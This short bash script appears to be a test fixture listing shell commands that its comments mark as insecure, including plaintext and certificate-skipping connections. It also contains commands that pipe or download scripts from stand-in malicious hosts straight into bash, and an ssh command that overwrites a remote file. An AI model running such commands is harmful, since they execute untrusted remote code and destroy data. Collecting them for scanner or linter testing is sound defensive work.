#!/bin/bash

# Insecure curl with -k option
curl -k https://malicious-site.com

# General Unsecure Protocols
curl http://insecure-site.com
ftp insecure-site.com
telnet insecure-site.com

# Secure but potentially unsafe commands
# Unsafe curl command
curl -sL https://malicious-script.com | bash

# Unsafe wget command
wget https://malicious-file.com -O malicious-file.sh && bash malicious-file.sh

# Unsafe ssh usage
ssh user@malicious-host "echo 'Compromised data' > /important/file.txt"
